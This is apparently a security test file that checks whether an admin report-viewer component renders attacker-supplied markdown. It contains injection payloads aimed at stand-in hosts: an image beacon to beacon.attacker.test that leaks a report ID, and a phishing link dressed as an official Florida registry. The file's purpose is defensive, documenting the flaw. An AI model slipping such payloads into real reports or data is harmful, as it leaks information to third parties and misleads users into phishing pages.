/**
 * M step 2 · REFUTER C1C2, admin side. `apps/admin/src/components/ReportViewer.tsx`
 * is imported by NOTHING in the admin app (the admin opens reports through the
 * product app's /report/:id?rt= page — JobDetail.tsx:65-72). Rendered here only
 * to settle the finder's "reasoned" claim about it.
 */
import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/react';
import { MantineProvider } from '@mantine/core';
import { ReportViewer } from '../src/components/ReportViewer';

const BEACON = 'https://beacon.attacker.test/p.gif?ref=PZ-IMG&report=REPORT-ID';
const IMG_MD = `![Bubbles Express verified photo](${BEACON})`;
const show = (report: Record<string, unknown>, sections: Array<{ key: string; title: string }>) =>
  render(<MantineProvider><ReportViewer report={report} sections={sections} /></MantineProvider>);

describe('C1C2 · the (unused) admin viewer', () => {
  it.fails('C1 · prose <img> renders here too (mdComponents overrides only `a`)', () => {
    const { container } = show({ findings: { overview: `Two match. ${IMG_MD}` } }, [{ key: 'findings', title: 'Findings' }]);
    expect(screen.getByText(/Two match/)).toBeTruthy();
    expect([...container.querySelectorAll('img')].map((i) => i.getAttribute('src'))).toEqual([]);
  });

  it.fails('C2 (WORSE here) · the FLORIDA `{items:[{url,label}]}` shape has no SourceList branch — `label` goes through <Markdown>, so a Florida title renders as a link + image', () => {
    const { container } = show(
      { sources: { items: [{ id: 1, url: 'https://attacker.test/registry', label: `[Florida DBPR — Official Registry](https://phish.attacker.test) ${IMG_MD}` }] } },
      [{ key: 'sources', title: 'Sources' }],
    );
    expect(screen.getByText('Florida DBPR — Official Registry')).toBeTruthy();
    console.log('admin phish anchor:', !!container.querySelector('a[href="https://phish.attacker.test"]'), 'img:', container.querySelectorAll('img').length);
    expect(container.querySelector('a[href="https://phish.attacker.test"]')).toBeNull();
    expect(container.querySelector('img')).toBeNull();
  });
});
